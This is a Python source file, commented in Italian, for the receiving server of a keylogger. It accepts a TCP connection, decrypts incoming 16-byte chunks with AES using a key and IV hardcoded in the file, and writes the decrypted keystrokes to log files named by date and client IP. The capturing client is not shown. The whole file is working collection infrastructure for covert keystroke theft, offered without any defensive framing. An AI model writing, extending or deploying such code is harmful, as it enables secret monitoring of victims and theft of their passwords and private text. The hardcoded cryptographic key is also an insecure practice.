# Server Program
import socket # Libreria per la creazione e gestione di socket
import logging  # Libreria per loggare informazioni su documenti
from datetime import date # Libreria per gestire le date
from Crypto.Cipher import AES # Algoritmo di crittografia a chiave simmetrica


def decryptData(textToDecrypt: str):
    aes = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
    text = aes.decrypt(textToDecrypt)
    return text.decode()


socketOpened = False
while not socketOpened:
    # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketOpened = True

    # Binding del socket e attesa di connessione da parte del client
    serverSocket.bind(("127.0.0.1",9090))
    print("> In attesa di connessione...")
    serverSocket.listen()

    # Avvenuta connessione da parte del processo client
    (clientConnected, clientAddress) = serverSocket.accept()
    print("  >> Client connesso. (%s:%s)" % (clientAddress[0], clientAddress[1]))

    # Inizializzazione del file di log in cui salvare i tasti digitati
    logging.basicConfig(filename=("./DATE_%s-IP_%s.txt" % (date.today().strftime("%d.%m.%Y"), clientAddress[0])), level=logging.DEBUG, format="[%(asctime)s] | %(message)s", datefmt='%H:%M:%S')
    logging.info("# Client connesso #")

    # Ricezione caratteri digitati dal client 
    counter = 0
    while(socketOpened):
        try:
            textEncrypted = clientConnected.recv(16)
            textDecrypted = decryptData(textEncrypted).replace('\'', '')

            if(textDecrypted != ''):
                counter = 0
                print("  |> Ricevo (%s > \'%s\')" % (textEncrypted, textDecrypted))
                logging.info(textDecrypted)
            else:
                counter += 1
                if counter == 100:
                    logging.info("# Client disconnesso #")
                    print("     >>> Client disconnesso.")
                    serverSocket.close()
                    socketOpened = False

        except socket.error:
            logging.info("# Client disconnesso #")
            print("     >>> Client disconnesso.")
            serverSocket.close()
            socketOpened = False